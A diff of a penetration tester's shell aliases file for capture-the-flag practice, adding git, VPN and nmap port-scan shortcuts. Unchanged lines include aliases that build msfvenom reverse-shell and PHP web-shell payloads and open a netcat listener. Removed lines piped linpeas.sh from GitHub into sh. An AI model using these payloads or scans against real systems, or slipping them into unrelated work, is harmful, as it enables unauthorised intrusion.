@@ -9,22 +9,76 @@ if [ -x /usr/bin/dircolors ]; then
     test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
     alias ls='ls --color=auto'
     alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
     alias egrep='egrep --color=auto'
 fi
 
-# ls aliases
-alias ll='ls -l'
+alias ll='ls -alF'
 alias la='ls -A'
 alias l='ls -CF'
+alias cls='clear'
+
+# git shortcuts
+alias gs='git status'
+alias ga='git add'
+alias gc='git commit'
+alias gp='git push'
+alias gco='git checkout'
+
+# tmux vpn connect
+alias htbvpn='tmux new-session -s htbvpn "sudo openvpn ~/Documents/htb.ovpn"'
+alias thmvpn='tmux new-session -s thmvpn "sudo openvpn ~/Documents/thm.ovpn"'
+
+# quick connect to openvpn (outside tmux)
+alias vpnup='sudo openvpn ~/Documents/htb.ovpn'
+
+# port scanning function
+port-scan() {
+    if [ $# -ne 1 ]; then
+        echo -e "\e[91mUsage: port-scan <target-ip>\e[0m"
+        return 1
+    fi
+    local box="$1"
+    local timestamp=$(date '+%Y-%m-%d_%H-%M-%S')
+    local output_dir="scans/$box"
+    mkdir -p "$output_dir"
+    local initial_scan="$output_dir/${box}_initial_$timestamp"
+    local detailed_scan="$output_dir/${box}_detailed_$timestamp"
+    echo -e "\e[92m[+] Scanning all ports on $box...\e[0m"
+    sudo nmap -Pn -sS -p- --open -T4 --min-rate=1000 "$box" -oN "${initial_scan}.nmap"
+    local ports=$(grep "/tcp" "${initial_scan}.nmap" | grep "open" | awk -F '/' '{print $1}' | paste -sd, -)
+    if [ -z "$ports" ]; then
+        echo -e "\e[93m[-] No open ports found on $box.\e[0m"
+        return
+    fi
+    echo -e "\e[92m[+] Found open ports: $ports\e[0m"
+    echo -e "\e[94m[*] Running detailed scan on $box...\e[0m"
+    sudo nmap -Pn -p "$ports" -sC -sV --script=default "$box" -oN "${detailed_scan}.nmap"
+    echo -e "\e[92m[+] Detailed scan saved to: ${detailed_scan}.nmap\e[0m"
+}
+
+# Nmap Shortcuts
+alias nmapfast='nmap -F -Pn -sV --open'
+alias nmapfull='sudo nmap -Pn -sS -T4 -p- --open'
+
+# === Utility Functions ===
+
+# Show available custom aliases and functions
+function cheat() {
+    grep -E "^alias|^function" ~/.bash_aliases | grep -v '^#'
+}
+
+# Reload shell configuration
+alias reload="source ~/.bashrc"
+
+# Safer file ops
+alias rm='rm -i'
+alias cp='cp -i'
+alias mv='mv -i'
 
 # Quick shortcuts
 alias c='clear'
 alias tree='tree -C -L 2'
-
-# Directory shortcuts
-alias ..='cd ..'
-alias ...='cd ../../'
-alias ....='cd ../../../'
 
 # Continue downloads
 alias wget='wget -c'
@@ -32,15 +86,10 @@ alias wget='wget -c'
 # Open with default applications
 alias open='xdg-open'
 
-# VPN Aliases (renamed to avoid conflict)
-alias htbvpn='tmux sudo openvpn ~/PathTo/hackthebox.ovpn'
-alias thmvpn='tmux sudo openvpn ~/PathTo/tryhackme.ovpn'
-
 # Searchsploit functions
 ssp() { searchsploit "$@"; }
 ssx() { searchsploit -x "$@"; }
 ssm() { searchsploit -m "$@"; }
-
 
 # CTF Directory Navigation
 alias ctf='cd ~/ctf && ls'
@@ -55,7 +104,7 @@ alias flushdns='sudo systemd-resolve --flush-caches'
 alias ports='netstat -tulnp'
 
 # Simple HTTP Server
-alias pyserve='python3 -m http.server 8000'
+alias pyserve='python3 -m http.server 80'
 
 # Web Enumeration & Fuzzing
 alias gobuster='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt'
@@ -66,14 +115,6 @@ alias listen='nc -lvnp'
 alias revshell='msfvenom -p linux/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=9001 -f elf -o revshell'
 alias webshell='msfvenom -p php/reverse_php LHOST=$(vpnip) LPORT=9001 -o shell.php'
 
-# Notes & Organization
-alias ctfnotes='vim notes.md'
-alias loot='mkdir -p loot && cd loot'
-
-# Nmap Shortcuts
-alias nmapfast='nmap -F -Pn -sV --open'
-alias nmapfull='sudo nmap -Pn -sS -T4 -p- --open'
-
 # Docker Shortcuts
 alias dockershell='docker exec -it'
 alias dockerclean='docker rm -v $(docker ps -aq -f status=exited)'
@@ -82,10 +123,6 @@ alias dockerclean='docker rm -v $(docker ps -aq -f status=exited)'
 alias tmuxstart='tmux new-session -s'
 alias tmuxattach='tmux attach -t'
 alias tmuxlist='tmux ls'
-
-# Post-Exploitation Enumeration
-alias linpeas='curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
-alias winpeas='curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe'
 
 # Miscellaneous Tools
 alias extract='7z x'
@@ -106,27 +143,3 @@ shieldsup() {
   echo -e "\e[93m[+] Capture saved to $PCAP_FILE\e[0m"
 }
 
-# Improved Port Scanner (function)
-port-scan() {
-    if [ $# -ne 1 ]; then
-        echo -e "\e[91mUsage: port-scan <target-ip>\e[0m"
-        return 1
-    fi
-    local box="$1"
-    local timestamp=$(date '+%Y-%m-%d_%H-%M-%S')
-    local output_dir="scans/$box"
-    mkdir -p "$output_dir"
-    local initial_scan="$output_dir/${box}_initial_$timestamp"
-    local detailed_scan="$output_dir/${box}_detailed_$timestamp"
-    echo -e "\e[92m[+] Scanning all ports on $box...\e[0m"
-    sudo nmap -Pn -sS -p- --open -T4 --min-rate=1000 "$box" -oN "${initial_scan}.nmap"
-    local ports=$(grep "^\\d" "${initial_scan}.nmap" | grep "open" | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
-    if [ -z "$ports" ]; then
-        echo -e "\e[93m[-] No open ports found on $box.\e[0m"
-        return
-    fi
-    echo -e "\e[92m[+] Found open ports: $ports\e[0m"
-    echo -e "\e[94m[*] Running detailed scan on $box...\e[0m"
-    sudo nmap -Pn -p "$ports" -sC -sV --script=default "$box" -oN "${detailed_scan}.nmap"
-    echo -e "\e[92m[+] Detailed scan saved to: ${detailed_scan}.nmap\e[0m"
-}
